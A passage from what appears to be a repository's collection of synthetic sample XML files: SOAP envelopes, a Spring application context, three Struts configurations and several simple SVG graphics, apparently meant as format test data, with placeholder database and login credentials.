    <changefreq>yearly</changefreq>
    <priority>0.6</priority>
  </url>
  <url>
    <loc>https://example.com/contact</loc>
    <lastmod>2024-01-05</lastmod>
    <changefreq>yearly</changefreq>
    <priority>0.5</priority>
  </url>
</urlset>
</file>

<file path="sample_data/test_files_synthetic/small/soap/soap_fault.xml">
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsa:Action xmlns:wsa="http://www.w3.org/2005/08/addressing">
      http://www.w3.org/2005/08/addressing/soap/fault
    </wsa:Action>
  </soap:Header>
  <soap:Body>
    <soap:Fault>
      <faultcode>soap:Client</faultcode>
      <faultstring>Invalid input parameters</faultstring>
      <faultactor>http://example.com/calculator</faultactor>
      <detail>
        <error:ValidationError xmlns:error="http://example.com/errors">
          <error:Field>intA</error:Field>
          <error:Message>Value must be a valid integer</error:Message>
          <error:Code>INVALID_INTEGER</error:Code>
        </error:ValidationError>
      </detail>
    </soap:Fault>
  </soap:Body>
</soap:Envelope>
</file>

<file path="sample_data/test_files_synthetic/small/soap/soap_request.xml">
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:calc="http://tempuri.org/">
  <soap:Header>
    <auth:Authentication xmlns:auth="http://example.com/auth">
      <auth:Username>john.doe</auth:Username>
      <auth:Password>secret123</auth:Password>
    </auth:Authentication>
    <wsa:Action xmlns:wsa="http://www.w3.org/2005/08/addressing">
      http://tempuri.org/ICalculator/Add
    </wsa:Action>
    <wsa:MessageID xmlns:wsa="http://www.w3.org/2005/08/addressing">
      urn:uuid:12345678-1234-1234-1234-123456789012
    </wsa:MessageID>
  </soap:Header>
  <soap:Body>
    <calc:Add>
      <calc:intA>10</calc:intA>
      <calc:intB>5</calc:intB>
    </calc:Add>
  </soap:Body>
</soap:Envelope>
</file>

<file path="sample_data/test_files_synthetic/small/soap/soap_response.xml">
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:calc="http://tempuri.org/">
  <soap:Header>
    <wsa:RelatesTo xmlns:wsa="http://www.w3.org/2005/08/addressing">
      urn:uuid:12345678-1234-1234-1234-123456789012
    </wsa:RelatesTo>
  </soap:Header>
  <soap:Body>
    <calc:AddResponse>
      <calc:AddResult>15</calc:AddResult>
    </calc:AddResponse>
  </soap:Body>
</soap:Envelope>
</file>

<file path="sample_data/test_files_synthetic/small/soap/soap12_envelope.xml">
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
               xmlns:wsa="http://www.w3.org/2005/08/addressing"
               xmlns:user="http://example.com/userservice">
  <soap:Header>
    <wsa:To>http://example.com/userservice</wsa:To>
    <wsa:Action>http://example.com/userservice/GetUser</wsa:Action>
    <wsa:MessageID>urn:uuid:87654321-4321-4321-4321-210987654321</wsa:MessageID>
    <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <UsernameToken>
        <Username>admin</Username>
        <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">admin123</Password>
      </UsernameToken>
    </Security>
  </soap:Header>
  <soap:Body>
    <user:GetUser>
      <user:UserId>12345</user:UserId>
      <user:IncludeProfile>true</user:IncludeProfile>
    </user:GetUser>
  </soap:Body>
</soap:Envelope>
</file>

<file path="sample_data/test_files_synthetic/small/spring/applicationContext-example.xml">
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:tx="http://www.springframework.org/schema/tx"
       xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:jdbc="http://www.springframework.org/schema/jdbc"
       xsi:schemaLocation="http://www.springframework.org/schema/beans 
                           http://www.springframework.org/schema/beans/spring-beans.xsd
                           http://www.springframework.org/schema/context 
                           http://www.springframework.org/schema/context/spring-context.xsd
                           http://www.springframework.org/schema/tx 
                           http://www.springframework.org/schema/tx/spring-tx.xsd
                           http://www.springframework.org/schema/mvc 
                           http://www.springframework.org/schema/mvc/spring-mvc.xsd
                           http://www.springframework.org/schema/jdbc 
                           http://www.springframework.org/schema/jdbc/spring-jdbc.xsd">

    <!-- Enable annotation-driven configuration -->
    <context:annotation-config />
    <context:component-scan base-package="com.example.app" />
    
    <!-- Enable Spring MVC -->
    <mvc:annotation-driven/>

    <!-- JSP View Resolver -->
    <bean id="jspViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="viewClass" value="org.springframework.web.servlet.view.JstlView" />
        <property name="prefix" value="/WEB-INF/jsp/" />
        <property name="suffix" value=".jsp" />
    </bean>

    <!-- Transaction Management -->
    <tx:annotation-driven />
    <bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
        <property name="entityManagerFactory" ref="entityManagerFactory" />
        <property name="dataSource" ref="dataSource"/>
    </bean>

    <!-- Development Profile Configuration -->
    <beans profile="default,dev">
        <jdbc:embedded-database id="dataSource" type="H2"/>        
        
        <bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
            <property name="dataSource" ref="dataSource"/>
            <property name="packagesToScan" value="com.example.app.model"/>
            <property name="jpaVendorAdapter">
                <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter"/>
            </property>
            <property name="jpaProperties">
                <props>
                    <prop key="hibernate.dialect">org.hibernate.dialect.H2Dialect</prop>
                    <prop key="hibernate.hbm2ddl.auto">create-drop</prop>
                    <prop key="hibernate.show_sql">true</prop>
                    <prop key="hibernate.format_sql">true</prop>
                </props>
            </property>
        </bean>
    </beans>

    <!-- Production Profile Configuration -->
    <beans profile="prod">
        <bean class="java.net.URI" id="dbUrl">
            <constructor-arg value="#{systemEnvironment['DATABASE_URL']}"/>
        </bean>

        <bean id="dataSource" class="org.apache.commons.dbcp2.BasicDataSource" destroy-method="close">
            <property name="url" value="#{ 'jdbc:postgresql://' + @dbUrl.getHost() + ':' + @dbUrl.getPort() + @dbUrl.getPath() }"/>
            <property name="username" value="#{ @dbUrl.getUserInfo().split(':')[0] }"/>
            <property name="password" value="#{ @dbUrl.getUserInfo().split(':')[1] }"/>
            <property name="driverClassName" value="org.postgresql.Driver"/>
            <property name="initialSize" value="5"/>
            <property name="maxTotal" value="20"/>
            <property name="maxIdle" value="10"/>
            <property name="minIdle" value="5"/>
            <property name="testOnBorrow" value="true"/>
            <property name="validationQuery" value="SELECT 1"/>
        </bean>
        
        <bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
            <property name="dataSource" ref="dataSource"/>
            <property name="packagesToScan" value="com.example.app.model"/>
            <property name="jpaVendorAdapter">
                <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter"/>
            </property>
            <property name="jpaProperties">
                <props>
                    <prop key="hibernate.dialect">org.hibernate.dialect.PostgreSQLDialect</prop>
                    <prop key="hibernate.hbm2ddl.auto">validate</prop>
                    <prop key="hibernate.show_sql">false</prop>
                    <prop key="hibernate.cache.use_second_level_cache">true</prop>
                    <prop key="hibernate.cache.region.factory_class">org.hibernate.cache.ehcache.EhCacheRegionFactory</prop>
                </props>
            </property>
        </bean>
    </beans>

    <!-- Sample Service Beans -->
    <bean id="messageService" class="com.example.app.service.MessageServiceImpl">
        <property name="greeting" value="Hello from Spring XML Configuration!" />
    </bean>

    <bean id="userService" class="com.example.app.service.UserServiceImpl">
        <constructor-arg ref="userRepository"/>
    </bean>

    <!-- Cache Manager -->
    <bean id="cacheManager" class="org.springframework.cache.ehcache.EhCacheManagerFactoryBean">
        <property name="configLocation" value="classpath:ehcache.xml"/>
        <property name="shared" value="true"/>
    </bean>

</beans>
</file>

<file path="sample_data/test_files_synthetic/small/struts/enterprise_struts_config.xml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts-config PUBLIC
    "-//Apache Software Foundation//DTD Struts Configuration 1.3//EN"
    "http://jakarta.apache.org/struts/dtds/struts-config_1_3.dtd">

<struts-config>
    <!-- Multiple Data Sources for Enterprise Application -->
    <data-sources>
        <!-- Primary Database -->
        <data-source key="primary" type="org.apache.commons.dbcp.BasicDataSource">
            <set-property property="driverClassName" value="oracle.jdbc.driver.OracleDriver"/>
            <set-property property="url" value="jdbc:oracle:thin:@localhost:1521:ENTERPRISE"/>
            <set-property property="username" value="enterprise_user"/>
            <set-property property="password" value="encrypted_password"/>
            <set-property property="maxActive" value="50"/>
            <set-property property="maxIdle" value="10"/>
            <set-property property="minIdle" value="5"/>
            <set-property property="testOnBorrow" value="true"/>
            <set-property property="validationQuery" value="SELECT 1 FROM DUAL"/>
        </data-source>
        
        <!-- Reporting Database -->
        <data-source key="reporting" type="org.apache.commons.dbcp.BasicDataSource">
            <set-property property="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/>
            <set-property property="url" value="jdbc:sqlserver://reportserver:1433;databaseName=Reports"/>
            <set-property property="username" value="report_user"/>
            <set-property property="password" value="report_pass"/>
            <set-property property="maxActive" value="20"/>
            <set-property property="maxIdle" value="5"/>
        </data-source>
    </data-sources>

    <!-- Comprehensive Form Bean Definitions -->
    <form-beans>
        <!-- User Management Forms -->
        <form-bean name="userRegistrationForm" type="com.enterprise.forms.UserRegistrationForm"/>
        <form-bean name="userProfileForm" type="com.enterprise.forms.UserProfileForm"/>
        <form-bean name="loginForm" type="com.enterprise.forms.LoginForm"/>
        
        <!-- Product Management Forms -->
        <form-bean name="productForm" type="com.enterprise.forms.ProductForm"/>
        <form-bean name="categoryForm" type="com.enterprise.forms.CategoryForm"/>
        
        <!-- Order Management Forms -->
        <form-bean name="orderForm" type="com.enterprise.forms.OrderForm"/>
        <form-bean name="paymentForm" type="com.enterprise.forms.PaymentForm"/>
        
        <!-- Dynamic Forms for Configuration -->
        <form-bean name="searchForm" type="org.apache.struts.action.DynaActionForm">
            <form-property name="searchTerm" type="java.lang.String"/>
            <form-property name="category" type="java.lang.String"/>
            <form-property name="priceMin" type="java.lang.Double" initial="0.0"/>
            <form-property name="priceMax" type="java.lang.Double" initial="999999.0"/>
            <form-property name="sortBy" type="java.lang.String" initial="name"/>
            <form-property name="sortOrder" type="java.lang.String" initial="ASC"/>
            <form-property name="pageSize" type="java.lang.Integer" initial="20"/>
        </form-bean>
        
        <form-bean name="reportForm" type="org.apache.struts.action.DynaActionForm">
            <form-property name="reportType" type="java.lang.String"/>
            <form-property name="startDate" type="java.util.Date"/>
            <form-property name="endDate" type="java.util.Date"/>
            <form-property name="format" type="java.lang.String" initial="PDF"/>
            <form-property name="includeDetails" type="java.lang.Boolean" initial="true"/>
        </form-bean>
    </form-beans>

    <!-- Global Forward Definitions -->
    <global-forwards>
        <!-- Main Navigation -->
        <forward name="home" path="/pages/dashboard.jsp"/>
        <forward name="login" path="/pages/login.jsp"/>
        <forward name="logout" path="/pages/logout.jsp"/>
        <forward name="unauthorized" path="/pages/error/unauthorized.jsp" redirect="true"/>
        <forward name="sessionTimeout" path="/pages/error/timeout.jsp" redirect="true"/>
        
        <!-- Error Pages -->
        <forward name="systemError" path="/pages/error/system.jsp"/>
        <forward name="notFound" path="/pages/error/404.jsp"/>
        <forward name="forbidden" path="/pages/error/403.jsp"/>
        
        <!-- Secure Pages -->
        <forward name="adminPanel" path="https://secure.enterprise.com/admin/" redirect="true"/>
        <forward name="userProfile" path="/secure/profile.jsp"/>
    </global-forwards>

    <!-- Comprehensive Action Mappings -->
    <action-mappings>
        <!-- Authentication Actions -->
        <action path="/login"
                type="com.enterprise.actions.LoginAction"
                name="loginForm"
                scope="request"
                validate="true"
                input="/pages/login.jsp">
            <forward name="success" path="/pages/dashboard.jsp"/>
            <forward name="failure" path="/pages/login.jsp"/>
            <forward name="changePassword" path="/pages/changePassword.jsp"/>
            <exception key="auth.locked" 
                      type="com.enterprise.exceptions.AccountLockedException" 
                      path="/pages/accountLocked.jsp"/>
            <exception key="auth.expired" 
                      type="com.enterprise.exceptions.PasswordExpiredException" 
                      path="/pages/changePassword.jsp"/>
        </action>

        <action path="/logout"
                type="com.enterprise.actions.LogoutAction">
            <forward name="success" path="login"/>
        </action>

        <!-- User Management Actions -->
        <action path="/registerUser"
                type="com.enterprise.actions.UserRegistrationAction"
                name="userRegistrationForm"
                scope="request"
                validate="true"
                input="/pages/registration.jsp">
            <forward name="success" path="/pages/registrationSuccess.jsp"/>
            <forward name="duplicate" path="/pages/registration.jsp"/>
            <forward name="emailConfirmation" path="/pages/confirmEmail.jsp"/>
        </action>

        <action path="/updateProfile"
                type="com.enterprise.actions.UpdateProfileAction"
                name="userProfileForm"
                scope="session"
                validate="true"
                input="/pages/profile.jsp">
            <forward name="success" path="/pages/profile.jsp"/>
            <forward name="error" path="/pages/profile.jsp"/>
        </action>

        <!-- Product Management Actions -->
        <action path="/searchProducts"
                type="com.enterprise.actions.ProductSearchAction"
                name="searchForm"
                scope="request"
                validate="false">
            <forward name="success" path="/pages/productList.jsp"/>
            <forward name="noResults" path="/pages/noProducts.jsp"/>
        </action>

        <action path="/addProduct"
                type="com.enterprise.actions.AddProductAction"
                name="productForm"
                scope="request"
                validate="true"
                input="/pages/addProduct.jsp"
                attribute="product">
            <forward name="success" path="/listProducts.do" redirect="true"/>
            <forward name="failure" path="/pages/addProduct.jsp"/>
            <forward name="unauthorized" path="forbidden"/>
        </action>

        <action path="/updateProduct"
                type="com.enterprise.actions.UpdateProductAction"
                name="productForm"
                scope="request"
                validate="true"
                input="/pages/editProduct.jsp">
            <forward name="success" path="/pages/productDetails.jsp"/>
            <forward name="concurrency" path="/pages/editProduct.jsp"/>
        </action>

        <action path="/deleteProduct"
                type="com.enterprise.actions.DeleteProductAction"
                parameter="method">
            <forward name="success" path="/listProducts.do" redirect="true"/>
            <forward name="references" path="/pages/cannotDelete.jsp"/>
            <forward name="unauthorized" path="forbidden"/>
        </action>

        <!-- Order Management Actions -->
        <action path="/createOrder"
                type="com.enterprise.actions.CreateOrderAction"
                name="orderForm"
                scope="session"
                validate="true"
                input="/pages/checkout.jsp">
            <forward name="success" path="/pages/orderConfirmation.jsp"/>
            <forward name="inventory" path="/pages/outOfStock.jsp"/>
            <forward name="payment" path="/processPayment.do"/>
        </action>

        <action path="/processPayment"
                type="com.enterprise.actions.PaymentAction"
                name="paymentForm"
                scope="request"
                validate="true"
                input="/pages/payment.jsp">
            <forward name="success" path="/pages/paymentSuccess.jsp"/>
            <forward name="declined" path="/pages/paymentDeclined.jsp"/>
            <forward name="fraud" path="/pages/fraudAlert.jsp"/>
        </action>

        <!-- Reporting Actions -->
        <action path="/generateReport"
                type="com.enterprise.actions.ReportGenerationAction"
                name="reportForm"
                scope="request"
                validate="true"
                input="/pages/reports.jsp">
            <forward name="success" path="/pages/reportViewer.jsp"/>
            <forward name="download" path="/downloadReport.do"/>
            <forward name="processing" path="/pages/reportProcessing.jsp"/>
        </action>

        <!-- Administrative Actions -->
        <action path="/adminUserList"
                type="com.enterprise.actions.AdminUserListAction"
                scope="request">
            <forward name="success" path="/admin/userList.jsp"/>
            <forward name="unauthorized" path="forbidden"/>
        </action>

        <action path="/systemHealth"
                type="com.enterprise.actions.SystemHealthAction">
            <forward name="success" path="/admin/systemHealth.jsp"/>
            <forward name="critical" path="/admin/systemAlert.jsp"/>
        </action>
    </action-mappings>

    <!-- Global Exception Definitions -->
    <global-exceptions>
        <!-- Database Exceptions -->
        <exception key="error.database.connection"
                   type="java.sql.SQLException"
                   path="/pages/error/database.jsp"
                   scope="request"/>
        <exception key="error.database.timeout"
                   type="java.sql.SQLTimeoutException"
                   path="/pages/error/timeout.jsp"/>
        
        <!-- Security Exceptions -->
        <exception key="error.security.access"
                   type="com.enterprise.exceptions.AccessDeniedException"
                   path="forbidden"/>
        <exception key="error.security.session"
                   type="com.enterprise.exceptions.SessionExpiredException"
                   path="sessionTimeout"/>
        
        <!-- Business Logic Exceptions -->
        <exception key="error.business.validation"
                   type="com.enterprise.exceptions.ValidationException"
                   path="/pages/error/validation.jsp"/>
        <exception key="error.business.inventory"
                   type="com.enterprise.exceptions.InsufficientInventoryException"
                   path="/pages/error/inventory.jsp"/>
        
        <!-- System Exceptions -->
        <exception key="error.system.general"
                   type="java.lang.Exception"
                   path="systemError"/>
        <exception key="error.system.integration"
                   type="com.enterprise.exceptions.IntegrationException"
                   path="/pages/error/integration.jsp"/>
    </global-exceptions>

    <!-- Controller Configuration -->
    <controller bufferSize="8192"
                contentType="text/html;charset=UTF-8"
                debug="0"
                inputForward="false"
                locale="true"
                maxFileSize="100M"
                multipartClass="org.apache.struts.upload.CommonsMultipartRequestHandler"
                nocache="true"
                processorClass="com.enterprise.struts.EnterpriseRequestProcessor"
                tempDir="/tmp/uploads"/>

    <!-- Message Resources for Internationalization -->
    <message-resources parameter="com.enterprise.resources.ApplicationResources"/>
    <message-resources parameter="com.enterprise.resources.ErrorResources" 
                       key="errors"/>
    <message-resources parameter="com.enterprise.resources.ValidationResources" 
                       key="validation"/>
    <message-resources parameter="com.enterprise.resources.AdminResources" 
                       key="admin"/>

    <!-- Enterprise Plugin Configuration -->
    <plug-in className="org.apache.struts.validator.ValidatorPlugIn">
        <set-property property="pathnames" 
                      value="/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml,/WEB-INF/validation-custom.xml"/>
        <set-property property="stopOnFirstError" value="false"/>
    </plug-in>

    <plug-in className="org.apache.struts.tiles.TilesPlugin">
        <set-property property="definitions-config" 
                      value="/WEB-INF/tiles-defs.xml,/WEB-INF/tiles-admin.xml"/>
        <set-property property="moduleAware" value="true"/>
        <set-property property="definitions-parser-validate" value="true"/>
    </plug-in>

    <plug-in className="com.enterprise.struts.SecurityPlugIn">
        <set-property property="securityConfig" value="/WEB-INF/security-config.xml"/>
        <set-property property="enableCSRFProtection" value="true"/>
        <set-property property="enableXSSProtection" value="true"/>
        <set-property property="sessionTimeout" value="30"/>
    </plug-in>

    <plug-in className="com.enterprise.struts.AuditPlugIn">
        <set-property property="auditLevel" value="INFO"/>
        <set-property property="auditActions" value="true"/>
        <set-property property="auditDatabase" value="primary"/>
    </plug-in>

    <plug-in className="com.enterprise.struts.CachePlugIn">
        <set-property property="cacheProvider" value="ehcache"/>
        <set-property property="configFile" value="/WEB-INF/cache-config.xml"/>
        <set-property property="enableMethodLevelCache" value="true"/>
    </plug-in>
</struts-config>
</file>

<file path="sample_data/test_files_synthetic/small/struts/legacy_struts_config.xml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts-config PUBLIC
    "-//Apache Software Foundation//DTD Struts Configuration 1.1//EN"
    "http://jakarta.apache.org/struts/dtds/struts-config_1_1.dtd">

<struts-config>
    <!-- Legacy Struts 1.1 Configuration -->
    
    <!-- Simple Data Source -->
    <data-sources>
        <data-source key="default" type="org.apache.struts.util.GenericDataSource">
            <set-property property="driverClass" value="org.postgresql.Driver"/>
            <set-property property="url" value="jdbc:postgresql://localhost:5432/legacy_app"/>
            <set-property property="user" value="legacy_user"/>
            <set-property property="password" value="legacy_pass"/>
            <set-property property="maxCount" value="10"/>
            <set-property property="minCount" value="2"/>
        </data-source>
    </data-sources>

    <!-- Basic Form Beans -->
    <form-beans>
        <form-bean name="employeeForm" type="com.legacy.forms.EmployeeForm"/>
        <form-bean name="departmentForm" type="com.legacy.forms.DepartmentForm"/>
        <form-bean name="searchForm" type="com.legacy.forms.SearchForm"/>
    </form-beans>

    <!-- Simple Global Forwards -->
    <global-forwards>
        <forward name="welcome" path="/welcome.do"/>
        <forward name="logon" path="/logon.jsp"/>
        <forward name="success" path="/pages/success.jsp"/>
        <forward name="failure" path="/pages/failure.jsp"/>
    </global-forwards>

    <!-- Basic Action Mappings -->
    <action-mappings>
        <action path="/welcome"
                forward="/pages/welcome.jsp"/>

        <action path="/logon"
                type="com.legacy.actions.LogonAction"
                name="logonForm"
                scope="request"
                input="/logon.jsp">
            <forward name="success" path="/pages/main.jsp"/>
            <forward name="failure" path="/logon.jsp"/>
        </action>

        <action path="/addEmployee"
                type="com.legacy.actions.AddEmployeeAction"
                name="employeeForm"
                scope="request"
                validate="false"
                input="/pages/addEmployee.jsp">
            <forward name="success" path="/listEmployees.do"/>
            <forward name="failure" path="/pages/addEmployee.jsp"/>
        </action>

        <action path="/listEmployees"
                type="com.legacy.actions.ListEmployeesAction">
            <forward name="success" path="/pages/employeeList.jsp"/>
        </action>

        <action path="/editEmployee"
                type="com.legacy.actions.EditEmployeeAction"
                name="employeeForm"
                scope="request"
                parameter="id">
            <forward name="success" path="/pages/editEmployee.jsp"/>
            <forward name="notfound" path="/listEmployees.do"/>
        </action>

        <action path="/deleteEmployee"
                type="com.legacy.actions.DeleteEmployeeAction"
                parameter="id">
            <forward name="success" path="/listEmployees.do"/>
            <forward name="error" path="/pages/error.jsp"/>
        </action>

        <!-- Department Management -->
        <action path="/listDepartments"
                type="com.legacy.actions.ListDepartmentsAction">
            <forward name="success" path="/pages/departmentList.jsp"/>
        </action>

        <action path="/addDepartment"
                type="com.legacy.actions.AddDepartmentAction"
                name="departmentForm"
                scope="request"
                input="/pages/addDepartment.jsp">
            <forward name="success" path="/listDepartments.do"/>
            <forward name="failure" path="/pages/addDepartment.jsp"/>
        </action>

        <!-- Search Functionality -->
        <action path="/search"
                type="com.legacy.actions.SearchAction"
                name="searchForm"
                scope="request">
            <forward name="results" path="/pages/searchResults.jsp"/>
            <forward name="empty" path="/pages/noResults.jsp"/>
        </action>
    </action-mappings>

    <!-- Controller Configuration -->
    <controller processorClass="org.apache.struts.action.RequestProcessor"
                bufferSize="4096"
                contentType="text/html"
                debug="2"
                inputForward="true"
                locale="false"
                maxFileSize="2M"
                multipartClass="org.apache.struts.upload.DiskMultipartRequestHandler"
                nocache="false"
                tempDir="/var/tmp"/>

    <!-- Message Resources -->
    <message-resources parameter="ApplicationResources"/>

    <!-- Basic Plugin Configuration -->
    <plug-in className="org.apache.struts.validator.ValidatorPlugIn">
        <set-property property="pathnames" 
                      value="/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml"/>
    </plug-in>
</struts-config>
</file>

<file path="sample_data/test_files_synthetic/small/struts/simple_struts_config.xml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts-config PUBLIC
    "-//Apache Software Foundation//DTD Struts Configuration 1.3//EN"
    "http://struts.apache.org/dtds/struts-config_1_3.dtd">

<struts-config>
    <!-- Data Sources -->
    <data-sources>
        <data-source key="default" type="org.apache.commons.dbcp.BasicDataSource">
            <set-property property="driverClassName" value="com.mysql.jdbc.Driver"/>
            <set-property property="url" value="jdbc:mysql://localhost:3306/bookstore"/>
            <set-property property="username" value="bookuser"/>
            <set-property property="password" value="bookpass"/>
            <set-property property="maxActive" value="20"/>
            <set-property property="maxIdle" value="5"/>
        </data-source>
    </data-sources>

    <!-- Form Bean Definitions -->
    <form-beans>
        <form-bean name="loginForm" type="com.bookstore.forms.LoginForm"/>
        <form-bean name="bookForm" type="com.bookstore.forms.BookForm"/>
        <form-bean name="userForm" type="org.apache.struts.action.DynaActionForm">
            <form-property name="username" type="java.lang.String"/>
            <form-property name="email" type="java.lang.String"/>
            <form-property name="age" type="java.lang.Integer" initial="0"/>
        </form-bean>
    </form-beans>

    <!-- Global Forward Definitions -->
    <global-forwards>
        <forward name="home" path="/pages/home.jsp"/>
        <forward name="login" path="/pages/login.jsp"/>
        <forward name="error" path="/pages/error.jsp"/>
        <forward name="unauthorized" path="/pages/unauthorized.jsp" redirect="true"/>
    </global-forwards>

    <!-- Action Mapping Definitions -->
    <action-mappings>
        <action path="/login"
                type="com.bookstore.actions.LoginAction"
                name="loginForm"
                scope="request"
                validate="true"
                input="/pages/login.jsp">
            <forward name="success" path="/pages/welcome.jsp"/>
            <forward name="failure" path="/pages/login.jsp"/>
            <exception key="login.error" 
                      type="com.bookstore.exceptions.LoginException" 
                      path="/pages/login.jsp"/>
        </action>

        <action path="/logout"
                type="com.bookstore.actions.LogoutAction">
            <forward name="success" path="home"/>
        </action>

        <action path="/addBook"
                type="com.bookstore.actions.AddBookAction"
                name="bookForm"
                scope="request"
                validate="true"
                input="/pages/addBook.jsp">
            <forward name="success" path="/pages/bookList.jsp"/>
            <forward name="failure" path="/pages/addBook.jsp"/>
        </action>

        <action path="/listBooks"
                type="com.bookstore.actions.ListBooksAction">
            <forward name="success" path="/pages/bookList.jsp"/>
        </action>

        <action path="/deleteBook"
                type="com.bookstore.actions.DeleteBookAction"
                parameter="method">
            <forward name="success" path="/listBooks.do" redirect="true"/>
            <forward name="error" path="error"/>
        </action>
    </action-mappings>

    <!-- Global Exception Definitions -->
    <global-exceptions>
        <exception key="global.error.database"
                   type="java.sql.SQLException"
                   path="/pages/databaseError.jsp"/>
        <exception key="global.error.system"
                   type="java.lang.Exception"
                   path="error"/>
    </global-exceptions>

    <!-- Controller Configuration -->
    <controller bufferSize="4096"
                contentType="text/html;charset=UTF-8"
                debug="1"
                inputForward="false"
                locale="true"
                maxFileSize="250M"
                multipartClass="org.apache.struts.upload.CommonsMultipartRequestHandler"
                nocache="true"
                processorClass="org.apache.struts.action.RequestProcessor"
                tempDir="/tmp"/>

    <!-- Message Resources -->
    <message-resources parameter="com.bookstore.resources.ApplicationResources"/>
    <message-resources parameter="com.bookstore.resources.ErrorResources" 
                       key="errors"/>

    <!-- Plugin Definitions -->
    <plug-in className="org.apache.struts.validator.ValidatorPlugIn">
        <set-property property="pathnames" 
                      value="/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml"/>
    </plug-in>

    <plug-in className="org.apache.struts.tiles.TilesPlugin">
        <set-property property="definitions-config" 
                      value="/WEB-INF/tiles-defs.xml"/>
        <set-property property="moduleAware" value="true"/>
    </plug-in>
</struts-config>
</file>

<file path="sample_data/test_files_synthetic/small/svg/animation.svg">
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
  <title>Loading Animation</title>
  <desc>Animated loading spinner with rotation</desc>
  <style>
    .spinner { animation: spin 2s linear infinite; }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <circle cx="50" cy="50" r="40" fill="none" stroke="#3498db" stroke-width="4" stroke-dasharray="60 40" class="spinner">
    <animateTransform 
      attributeName="transform" 
      attributeType="XML" 
      type="rotate" 
      from="0 50 50" 
      to="360 50 50" 
      dur="2s" 
      repeatCount="indefinite"/>
  </circle>
  <text x="50" y="55" text-anchor="middle" font-family="Arial" font-size="12" fill="#666">Loading...</text>
</svg>
</file>

<file path="sample_data/test_files_synthetic/small/svg/chart.svg">
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300" viewBox="0 0 400 300">
  <title>Sales Chart</title>
  <desc>Bar chart showing quarterly sales data</desc>
  <style>
    .axis { stroke: #333; stroke-width: 2; }
    .bar { fill: #2ecc71; opacity: 0.8; }
    .bar:hover { opacity: 1; }
    .label { font-family: Arial; font-size: 12px; fill: #333; }
  </style>
  
  <!-- Chart axes -->
  <line x1="50" y1="250" x2="350" y2="250" class="axis" />
  <line x1="50" y1="50" x2="50" y2="250" class="axis" />
  
  <!-- Bars -->
  <rect x="80" y="150" width="50" height="100" class="bar" />
  <rect x="150" y="120" width="50" height="130" class="bar" />
  <rect x="220" y="100" width="50" height="150" class="bar" />
  <rect x="290" y="80" width="50" height="170" class="bar" />
  
  <!-- Labels -->
  <text x="105" y="270" text-anchor="middle" class="label">Q1</text>
  <text x="175" y="270" text-anchor="middle" class="label">Q2</text>
  <text x="245" y="270" text-anchor="middle" class="label">Q3</text>
  <text x="315" y="270" text-anchor="middle" class="label">Q4</text>
  
  <!-- Values -->
  <text x="105" y="140" text-anchor="middle" class="label">100K</text>
  <text x="175" y="110" text-anchor="middle" class="label">130K</text>
  <text x="245" y="90" text-anchor="middle" class="label">150K</text>
  <text x="315" y="70" text-anchor="middle" class="label">170K</text>
</svg>
</file>

<file path="sample_data/test_files_synthetic/small/svg/icon.svg">
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
  <title>Home Icon</title>
  <desc>A simple house icon for navigation</desc>
  <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
  <polyline points="9,22 9,12 15,12 15,22"/>
</svg>
</file>

<file path="sample_data/test_files_synthetic/small/svg/logo.svg">
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="80" viewBox="0 0 200 80">
  <title>Company Logo</title>
  <desc>Corporate logo with text and graphic elements</desc>
  <defs>
    <linearGradient id="logoGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#ff6b6b;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#4ecdc4;stop-opacity:1" />
    </linearGradient>
  </defs>
  <g id="logoGroup">
    <circle cx="30" cy="40" r="25" fill="url(#logoGradient)" />
    <text x="70" y="45" font-family="Arial" font-size="24" font-weight="bold" fill="#333">TechCorp</text>
    <text x="70" y="60" font-family="Arial" font-size="12" fill="#666">Innovation Solutions</text>
  </g>
</svg>
</file>

<file path="sample_data/test_files_synthetic/small/svg/sample-icon.svg">
